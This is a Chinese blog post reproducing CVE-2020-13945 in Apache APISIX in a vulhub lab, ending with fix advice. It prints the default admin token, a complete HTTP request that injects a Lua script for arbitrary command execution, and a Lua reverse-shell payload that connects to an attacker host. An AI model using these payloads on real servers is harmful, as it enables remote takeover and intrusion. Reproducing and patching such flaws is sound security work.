---
title: Apache APISIX 默认密钥漏洞（CVE-2020-13945）
author: jh2ng
cover: 'http://image.jh2ing.com/image-20220713114523793.png'
tags:
  - vulhub
categories:
  - 漏洞复现
abbrlink: 38434
date: 2022-07-13 17:10:00
---

### Apache APISIX 默认密钥漏洞（CVE-2020-13945）

#### 漏洞描述

Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token `edd1c9f034335f136f87ad84b625c8f1`，攻击者利用这个Token可以访问到管理员接口，进而通过`script`参数来插入任意LUA脚本并执行。

#### 影响版本

```
Apache APISIX 1.2
Apache APISIX 1.3
Apache APISIX 1.4
Apache APISIX 1.5
```

#### 环境搭建

![image-20220713134306426](http://image.jh2ing.com/image-20220713134306426.png)

环境启动后，访问`http://your-ip:9080`即可查看到默认的404页面。

![image-20220713114523793](http://image.jh2ing.com/image-20220713114523793.png)

#### 漏洞复现

访问`http://your-ip:9080/apisix/admin/routes`

![image-20220713152059058](http://image.jh2ing.com/image-20220713152059058.png)

返回`failed to check token`，通过利用默认Token增加一个恶意的router，其中包含恶意LUA脚本：

```
POST /apisix/admin/routes HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
    "uri": "/attack",
"script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}
```

![image-20220713165438253](http://image.jh2ing.com/image-20220713165438253.png)

然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：

![image-20220713152335203](http://image.jh2ing.com/image-20220713152335203.png)

**反弹shell：**

编写LUA脚本

```lua
local _M={} 
 function _M.access(conf, ctx) 
 local s=require('socket') 
 local t=assert(s.tcp()) 
 t:connect('ip','端口') 
 while true do 
 	local r,x=t:receive();local f=assert(io.popen(r,'r')) 
 	local b=assert(f:read('*a'));t:send(b) 
 end 
 f:close();t:close()  
 end 
 return _M 
```

payload：

```
{
    "uri": "/shell",
"script": "local _M={} \n function _M.access(conf, ctx) \n local s=require('socket') \n local t=assert(s.tcp()) \n t:connect('ip','端口') \n while true do \n 	local r,x=t:receive();local f=assert(io.popen(r,'r')) \n 	local b=assert(f:read('*a'));t:send(b) \n end \n f:close();t:close()  \n end \n return _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}
```

![image-20220713165224995](http://image.jh2ing.com/image-20220713165224995.png)

访问对应url反弹shell：

![image-20220713164526251](http://image.jh2ing.com/image-20220713164526251.png)


#### 修复建议

- 修改Apache APISIX配置文件中 conf/config.yaml 的admin_key，禁止使用默认Token

- 若非必要，关闭Apache APISIX Admin API功能，或者增加IP访问限制

- 升级Apache APISIX 至最新版本
